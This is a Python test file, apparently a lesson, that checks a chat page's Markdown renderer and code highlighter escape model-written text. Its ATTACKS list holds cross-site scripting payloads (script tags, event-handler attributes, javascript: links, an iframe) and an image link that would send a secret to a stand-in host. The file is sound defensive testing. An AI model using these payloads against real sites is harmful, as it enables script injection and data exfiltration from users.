"""Lesson 54: the page's Markdown and code highlighting, run in Node: model text must never become HTML of its own."""
import json
import re
import shutil
import subprocess
from pathlib import Path

import pytest

NODE = shutil.which("node")
SCRIPT = Path(__file__).resolve().parents[1] / "harness" / "web" / "static" / "markdown.js"
RUN = """
const fs = require("fs"), vm = require("vm");
const page = {}; vm.createContext(page);
vm.runInContext(fs.readFileSync(process.argv[1], "utf8"), page);
const calls = JSON.parse(fs.readFileSync(0, "utf8"));
process.stdout.write(JSON.stringify(calls.map(([fn, ...args]) => page[fn](...args))));
"""
TAGS = {"p", "br", "strong", "em", "del", "code", "pre", "a", "span", "ul", "ol", "li", "h1", "h2", "h3", "h4", "hr", "blockquote",
        "table", "tr", "th", "td"}
pytestmark = pytest.mark.skipif(NODE is None, reason="needs Node.js to run the page's script")


def run(*calls):
    done = subprocess.run([NODE, "-e", RUN, str(SCRIPT)], input=json.dumps(calls), capture_output=True, text=True, encoding="utf-8", check=True)
    return json.loads(done.stdout)


def only_our_tags(html: str) -> None:
    for tag, attrs in re.findall(r"<\s*/?\s*([a-zA-Z0-9]+)([^>]*)>", html):
        assert tag.lower() in TAGS, tag
        assert re.fullmatch(r'(\s+[a-z]+="[^"]*")*\s*', attrs), attrs       # nothing but name="value" pairs (a quote in a value is &quot;)
        pairs = dict(re.findall(r'\s+([a-z]+)="([^"]*)"', attrs))
        assert set(pairs) <= {"class", "href", "target", "rel"}, attrs
        assert re.match(r"https?://", pairs.get("href", "https://")), attrs


ATTACKS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "hello <b onclick=alert(1)>bold</b>",
    "[click](javascript:alert(1))",
    "[click](https://a.example/\"onmouseover=\"alert(1))",
    "![logo](https://evil.example/collect?d=SECRET)",
    "```html\n</code></pre><script>alert(1)</script>\n```",
    "| a | b |\n|---|---|\n| <svg onload=alert(1)> | `<i>` |",
    "> <iframe src=https://evil.example>",
    "- <a href=javascript:alert(1)>x</a>",
    "\u0000" + "0" + "\u0000 and `code`",
    "**<style>body{display:none}</style>**",
]


def test_model_text_never_becomes_html_of_its_own():
    for text, html in zip(ATTACKS, run(*[["md", a] for a in ATTACKS]), strict=True):
        only_our_tags(html)             # any "<script", "onerror=" left is text: the tags were escaped
        assert "<script" not in html and "<img" not in html, text


def test_pictures_are_never_fetched_and_links_open_safely():
    picture, link = run(["md", "![logo](https://evil.example/x.png?d=SECRET)"], ["md", "[docs](https://docs.python.org/3/)"])
    assert "<img" not in picture and "[image: logo]" in picture and "evil.example" not in picture
    assert link == '<p><a href="https://docs.python.org/3/" target="_blank" rel="noopener noreferrer">docs</a></p>'


def test_the_markdown_an_agent_writes():
    html = run(["md", "# Title\nSome **bold**, *em* and `code`.\n\n- one\n- two\n\n1. first\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n> ½ + x²\n\n```py\nx = 1\n```"])[0]
    assert html.startswith("<h1>Title</h1><p>Some <strong>bold</strong>, <em>em</em> and <code>code</code>.</p>")
    assert "<ul><li>one</li><li>two</li></ul><ol><li>first</li></ol>" in html
    assert "<table><tr><th>a</th><th>b</th></tr><tr><td>1</td><td>2</td></tr></table>" in html
    assert "<blockquote><p>½ + x²</p></blockquote>" in html and '<span class="n">1</span>' in html


def test_code_is_highlighted_and_still_escaped():
    py, js = run(["highlight", 'def f(x):  # say "<hi>"\n    return "<b>"', "py"], ["highlight", "const a = '<x>'; // </pre>", "js"])
    assert '<span class="k">def</span> <span class="f">f</span>' in py and '<span class="c"># say &quot;&lt;hi&gt;&quot;</span>' in py
    assert '<span class="s">&quot;&lt;b&gt;&quot;</span>' in py and "<b>" not in py
    assert "&lt;x&gt;" in js and "</pre>" not in js
    only_our_tags(py + js)
